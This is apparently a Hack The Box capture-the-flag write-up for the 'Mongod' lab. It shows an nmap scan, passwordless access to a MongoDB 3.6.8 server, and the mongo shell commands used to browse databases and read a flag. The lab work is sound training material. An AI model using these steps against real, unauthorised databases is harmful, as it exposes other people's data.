```toc
```
# HTB Notes - Mongod #

+ **Date**: 12-4-2022
+ **Author**: Noah Soqui
+ **Tags**: #MongoDB

## Intelligence Gathering ##

Scanning the target
+ `nmap -sV -p- 10.129.228.30`
+ Output:
``` Shell
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Misconfiguration and Vulnerability Analysis  ##

Can connect to the mongo database without credentials.

## Exploitation ##

Connect to mongo database
+ `mongo 10.129.228.30`

List and navigate to flag collection
+ `show dbs`
	+ See all the database 
``` Shell
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
```
+ An interesting database is `sensitive_information`, will navigate into that:
	+ `use sensitive_information`
+ Display all the collections in that database:
	+ `show collections`
``` Shell
> show collections
flag
```
+ Can now get the flag

## Post Exploitation ##

Display the flag collection and get the flag:
``` Shell
> db.flag.find().pretty();
{
        "_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
        "flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
```

## Reporting ##

### Executive Summary ###

MongoDB is a NoSQL server specifically document oriented. All data is stored in json documents in this implementation. The service will consist of databases, containing collections, which store documents, where the collection can be queried. In this case, there was no authentication required to connect to the database, so it was as simple as navigating to the flag.
